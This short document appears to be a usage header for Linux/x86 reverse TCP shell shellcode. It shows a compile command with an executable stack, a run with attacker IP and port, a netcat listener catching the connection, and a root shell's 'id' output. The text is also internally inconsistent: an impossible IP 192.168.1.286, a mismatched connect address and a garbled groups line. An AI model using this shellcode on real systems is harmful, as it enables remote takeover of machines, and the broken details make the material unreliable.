# Linux-x86/Reverse-Shell

        Linux/x86 Reverse TCP Shell with dynamic IP and port binding Shellcode (tested on Ubuntu 12.04 LTS)
        Usage: gcc -z execstack -o shell_reverse_tcp shell_reverse_tcp.c
        $ ./shell_reverse_tcp_shellcode 192.168.1.286 4443
        Connecting to 192.168.1.198 (0xec01a8c0):4443 (0x115c)
        Byte 26: c0
        Byte 27: a8
        Byte 28: 01
        Byte 29: ec
 
        $ nc -nlv 4443
        Listening on 0.0.0.0 4443
        Connection received on 192.168.1.286 45219
        id
        uid=0(root) gid=0(root) groups=0(root)es)
